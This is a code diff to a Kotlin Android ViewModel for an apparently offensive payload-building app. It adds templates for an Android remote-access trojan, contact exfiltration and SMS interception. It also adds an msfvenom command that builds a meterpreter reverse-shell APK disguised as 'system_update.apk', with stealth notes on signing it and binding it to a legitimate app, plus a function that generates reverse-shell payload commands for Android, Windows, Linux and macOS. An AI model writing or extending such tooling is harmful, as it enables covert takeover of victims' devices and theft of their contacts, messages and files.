@@ -31,12 +31,11 @@ class PayloadForgeViewModel(application: Application) : AndroidViewModel(applica
     private val prefs = application.getSharedPreferences("rabit_prefs", Context.MODE_PRIVATE)
 
     val templates = listOf(
-        PayloadTemplate("Reverse Shell", "Linux/Android", "Establish a persistent remote shell.", "C2"),
-        PayloadTemplate("Credential Harvester", "Windows", "Extract stored browser passwords.", "Recovery"),
-        PayloadTemplate("HID Keyboard Infiltration", "All", "Inject keystrokes to bypass UI locks.", "HID"),
-        PayloadTemplate("Data Exfiltrator", "macOS", "Gather documents and upload to remote C2.", "Exfiltration"),
         PayloadTemplate("WiFi Pass Recovery", "Windows", "Export all saved WiFi profiles.", "Recovery"),
-        PayloadTemplate("Persistence Link", "Linux", "Add a cronjob or systemd service for persistence.", "Maintenance")
+        PayloadTemplate("Persistence Link", "Linux", "Add a cronjob or systemd service for persistence.", "Maintenance"),
+        PayloadTemplate("Android File Access RAT", "Android", "Full remote filesystem control via APK.", "Mobile"),
+        PayloadTemplate("Contact Exfiltration", "Android", "Extract all contacts to remote C2.", "Mobile"),
+        PayloadTemplate("SMS Monitor", "Android", "Intercept and log incoming SMS messages.", "Mobile")
     )
 
     // Pre-built library for offline tactical use
@@ -58,6 +57,18 @@ class PayloadForgeViewModel(application: Application) : AndroidViewModel(applica
             DELAY 500
             STRING echo You have been audited by Hackie Pro
             ENTER
+        """.trimIndent(),
+        "Android File Access RAT" to """
+            # MSFVENOM COMMAND (Run on your PC/Kali)
+            msfvenom -p android/meterpreter/reverse_tcp LHOST=[IP] LPORT=4444 -o system_update.apk
+            
+            # STEALTH NOTE: 
+            # 1. Sign the APK using 'jarsigner' to avoid install blocks.
+            # 2. Use 'apktool' to bind this payload to a legitimate app for maximum stealth.
+        """.trimIndent(),
+        "Contact Exfiltration" to """
+            # Android Tactical Contact Dump (ADB Required)
+            adb shell content query --uri content://contacts/phones --projection display_name:data1
         """.trimIndent()
     )
 
@@ -106,5 +117,23 @@ class PayloadForgeViewModel(application: Application) : AndroidViewModel(applica
 
     fun clearError() {
         _error.value = null
+    }
+
+    fun generateMsfvenomCommand(platform: String, lhost: String, lport: String): String {
+        val payload = when(platform) {
+            "Android" -> "android/meterpreter/reverse_tcp"
+            "Windows" -> "windows/x64/meterpreter/reverse_tcp"
+            "Linux" -> "linux/x64/meterpreter/reverse_tcp"
+            "macOS" -> "osx/x64/meterpreter_reverse_tcp"
+            else -> "android/meterpreter/reverse_tcp"
+        }
+        val ext = when(platform) {
+            "Android" -> "apk"
+            "Windows" -> "exe"
+            "Linux" -> "elf"
+            "macOS" -> "macho"
+            else -> "bin"
+        }
+        return "msfvenom -p $payload LHOST=$lhost LPORT=$lport -f $ext -o payload.$ext"
     }
 }
